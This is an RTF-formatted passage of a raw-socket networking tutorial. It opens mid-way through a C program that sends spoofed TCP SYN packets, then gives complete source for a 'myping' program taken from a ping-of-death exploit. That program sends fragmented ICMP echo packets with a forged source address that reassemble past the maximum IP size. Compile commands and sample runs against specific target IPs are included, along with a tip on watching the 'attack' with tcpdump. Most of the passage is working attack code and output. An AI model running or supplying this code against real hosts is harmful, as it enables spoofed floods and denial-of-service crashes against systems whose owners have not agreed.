\f0\fs32 \cf3 // Source IP, modify as needed, spoofed, we accept through command line argument
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_sourceip = inet_addr(argv[1]);
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Destination IP, modify as needed, but here we accept through command line argument
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_destip = inet_addr(argv[3]);
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // The TCP structure. The source port, spoofed, we accept through the command line
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 tcp->tcph_srcport = htons(atoi(argv[2]));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // The destination port, we accept through command line
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 tcp->tcph_destport = htons(atoi(argv[4]));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_seqnum = htonl(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_acknum = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_offset = 5;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_syn = 1;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_ack = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_win = htons(32767);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_chksum = 0; \cf3 // Done by kernel
\f1\fs26 \cf0 \

\f0\fs32 \cf4 tcp->tcph_urgptr = 0;
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // IP checksum calculation
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_chksum = csum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Inform the kernel do not fill up the headers' structure, we fabricated our own
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0 perror("setsockopt() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 printf("setsockopt() is OK\\n");
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 printf("Using:::::Source IP: %s port: %u, Target IP: %s port: %u.\\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // sendto() loop, send every 2 second for 50 counts
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 unsigned int count;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 for(count = 0; count < 20; count++)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 if(sendto(sd, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Verify
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 perror("sendto() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 printf("Count #%u - sendto() is OK\\n", count);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 sleep(2);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 close(sd);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 return 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 gcc rawtcp.c -o rawtcp
\f1\fs26 \cf0 \

\f0\fs32 [root@bakawali testraw]# \cf2 ./rawtcp
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf5 - Invalid parameters!!!
\f1\fs26 \cf0 \

\f0\fs32 \cf5 - Usage: ./rawtcp <source hostname/IP> <source port> <target hostname/IP> <target port>
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 ./rawtcp 10.10.10.100 23 203.106.93.88 8008
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf5 socket()-SOCK_RAW and tcp protocol is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 setsockopt() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Using:::::Source IP: 10.10.10.100 port: 23, Target IP: 203.106.93.88 port: 8008.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #0 - sendto() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #1 - sendto() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #2 - sendto() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #3 - sendto() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #4 - sendto() is OK
\f1\fs26 \cf0 \

\f0\fs32 \cf5 ...
\f1\fs26 \cf0 \
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\pard\pardeftab720\qc
\cf0 \'a0\ul \
\pard\pardeftab720

\f2\fs32 \cf0 \ulnone \
\

\f3\fs24 {{\NeXTGraphic 1__#$!@%!#__icon.png \width300 \height300 \noorient
}¬}
\f2\fs32 \
\pard\pardeftab720

\f1\fs26 \cf0 \'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\'a0\
\pard\pardeftab720

\f4\fs32 \cf0 Network utilities applications such as {\field{\*\fldinst{HYPERLINK "http://ftp.arl.mil/~mike/ping.html"}}{\fldrslt \cf4 ping}} and Traceroute (check Unix/Linux man page) use ICMP and raw socket.\'a0 The following is a very loose ping and ICMP program example.\'a0 It is taken from 
\b ping-of-death
\b0  program.
\f1\fs26 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 cat myping.c
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 /* Must be root or SUID 0 to open RAW socket */
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 #include <stdio.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <sys/types.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <sys/socket.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netdb.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/in.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/in_systm.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/ip.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/ip_icmp.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <string.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <arpa/inet.h>
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 int main(int argc, char *argv[])
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 int s, i;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 char buf[400];
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 struct ip *ip = (struct ip *)buf;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 struct hostent *hp, *hp2;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 struct sockaddr_in dst;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 int offset;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 int on;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 int num = 100;
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0 if(argc < 3)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 printf("\\nUsage: %s <saddress> <dstaddress> [number]\\n", argv[0]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 printf("- saddress is the spoofed source address\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 printf("- dstaddress is the target\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 printf("- number is the number of packets to send, 100 is the default\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 exit(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 \}
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0 \cf3 /* If enough argument supplied */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 if(argc == 4)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0 \cf3 /* Copy the packet number */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0 num = atoi(argv[3]);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0 \cf3 /* Loop based on the packet number */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0 for(i=1;i<=num;i++)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 on = 1;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 bzero(buf, sizeof(buf));
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* Create RAW socket */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 perror("socket() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* If something wrong, just exit */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 exit(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* socket options, tell the kernel we provide the IP structure */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 perror("setsockopt() for IP_HDRINCL error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 exit(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 if((hp = gethostbyname(argv[2])) == NULL)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 fprintf(stderr, "%s: Can't resolve, unknown host.\\n", argv[2]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 exit(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* The following source address just redundant for target to collect */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 if((hp2 = gethostbyname(argv[1])) == NULL)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 fprintf(stderr, "%s: Can't resolve, unknown host\\n", argv[1]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 exit(1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 printf("Sending to %s from spoofed %s\\n", inet_ntoa(ip->ip_dst), argv[1]);
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 /* Ip structure, check the {\field{\*\fldinst{HYPERLINK "http://lxr.linux.no/"}}{\fldrslt \cf2 ip.h}} */
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_v = 4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_hl = sizeof*ip >> 2;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_tos = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_len = htons(sizeof(buf));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_id = htons(4321);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_off = htons(0);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_ttl = 255;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_p = 1;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_sum = 0; \cf3 /* Let kernel fills in */
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 dst.sin_addr = ip->ip_dst;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 dst.sin_family = AF_INET;
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->type = ICMP_ECHO;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->code = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* Header checksum */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->checksum = htons(~(ICMP_ECHO << 8));
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_off = htons(offset >> 3);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 if(offset < 65120)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_off |= htons(0x2000);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 ip->ip_len = htons(418); \cf3 /* make total 65538 */
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* sending time */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 fprintf(stderr, "offset %d: ", offset);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 perror("sendto() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 printf("sendto() is OK.\\n");
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /* IF offset = 0, define our ICMP structure */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 if(offset == 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->type = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->code = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 icmp->checksum = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0 \cf3 /* close socket */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0 close(s);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0 usleep(30000);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0 return 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 gcc myping.c -o myping
\f1\fs26 \cf0 \

\f0\fs32 [root@bakawali testraw]# \cf2 ./myping
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf5 Usage: ./myping <saddress> <dstaddress> [number]
\f1\fs26 \cf0 \

\f0\fs32 \cf5 - saddress is the spoofed source address
\f1\fs26 \cf0 \

\f0\fs32 \cf5 - dstaddress is the target
\f1\fs26 \cf0 \

\f0\fs32 \cf5 - number is the number of packets to send, 100 is the default
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 ./myping\'a0 1.2.3.4\'a0 203.106.93.94\'a0 10000
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf5 sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 ...
\f1\fs26 \cf0 \

\f0\fs32 \cf5 ...
\f1\fs26 \cf0 \

\f0\fs32 \cf5 sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Sending to 203.106.93.88 from spoofed 1.2.3.4
\f1\fs26 \cf0 \

\f0\fs32 \cf5 sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 ...
\f1\fs26 \cf0 \
\pard\pardeftab720

\f4\fs32 \cf0 You can verify this \'91attack\'92 at the target machine by issuing the 
\f0 \cf6 tcpdump \'96vv
\f4 \cf0  command or other network analyzer tools such as {\field{\*\fldinst{HYPERLINK "http://ethereal.archive.sunet.se/"}}{\fldrslt \cf4 Ethereal}}/{\field{\*\fldinst{HYPERLINK "http://www.wireshark.org/"}}{\fldrslt \cf4 Wireshark}}.
\f1\fs26 \
\'a0}